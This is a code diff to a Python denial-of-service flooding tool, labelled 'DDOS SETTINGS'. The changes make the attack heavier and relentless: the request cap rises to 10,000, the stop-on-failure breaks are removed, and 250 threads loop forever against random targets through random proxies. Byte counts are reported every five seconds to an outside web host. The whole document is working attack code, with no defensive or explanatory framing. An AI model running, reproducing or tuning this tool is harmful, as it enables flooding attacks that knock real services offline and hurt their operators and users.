@@ -10,7 +10,7 @@ from threading import Lock
 import requests
 
 #DDOS SETTINGS
-MAX_SIMPLE_CONNECTION_REQUESTS = 120
+MAX_SIMPLE_CONNECTION_REQUESTS = 10000
 THREAD_COUNT = 250
 TIMEOUT = 1.0                           # secs
 USE_SOCKS_ONLY = False
@@ -274,7 +274,6 @@ class Attack:
                 sent = s.send(str.encode(request))
                 if not sent:
                     stats.add_bad()
-                    break
                 else:
                     stats.add_bytes(len(request))
                     stats.add_good()
@@ -345,7 +344,7 @@ class Attack:
                     sent = s.send(str.encode(request))
                     if not sent:
                         stats.add_bad()
-                        break
+                        # break
                     stats.add_bytes(len(request))
                     stats.add_good()
             s.close()
@@ -381,18 +380,26 @@ class DDoS:
 
         self.__load()
 
-    def run(self):
+    def unlimited_worker(self):
         while True:
-            threads = []
+            try:
+                target = self.__target_manager.get_rand()
+                proxy = self.__proxy_manager.get_rand()
+
+                Attack.attack_url(target, proxy)
+            except Exception as e:
+                print(e)
+    def run(self):
+        threads = []
+
+        for i in range(THREAD_COUNT):
+            threads.append(threading.Thread(target=self.unlimited_worker))
         
-            for i in range(THREAD_COUNT):
-                threads.append(threading.Thread(target=Attack.attack_url, args=(self.__target_manager.get_rand(), self.__proxy_manager.get_rand())))
-            
-            for thread in threads:
-                thread.start()
-            
-            for thread in threads:
-                thread.join()
+        for thread in threads:
+            thread.start()
+        
+        for thread in threads:
+            thread.join()
 
 ddos = DDoS()
 ddos_thread = threading.Thread(target=ddos.run)
@@ -404,7 +411,7 @@ cur_bytes = 0
 def send_data():
     global cur_bytes
     while True:
-        time.sleep(1200)
+        time.sleep(5)
         b = stats.get_bytes()
         print(b)
         requests.get("https://roflclicker.000webhostapp.com/ddos/getinfo.php?bytes="+str(b-cur_bytes))
